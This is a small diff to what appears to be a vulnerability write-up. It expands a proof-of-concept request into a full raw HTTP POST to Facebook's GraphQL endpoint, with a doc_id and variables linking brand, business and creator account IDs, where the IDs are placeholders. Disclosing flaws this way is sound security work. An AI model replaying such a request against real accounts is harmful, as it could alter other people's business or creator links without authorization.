@@ -35,7 +35,12 @@ The attacker only needed:
 
 ### 📤 Request
 ```http
-POST https://graph.facebook.com/graphql
+POST /graphql HTTP/1.1
+Host: graph.facebook.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Connection: close
 
 &doc_id=5822628081097871&variables={"input": {"client_mutation_id": "9","actor_id": "0","brand_ig_fbid": "{XXX}","business_id": "{AAA}","creator_ig_fbid": "{ID_creator}"}}
 ```
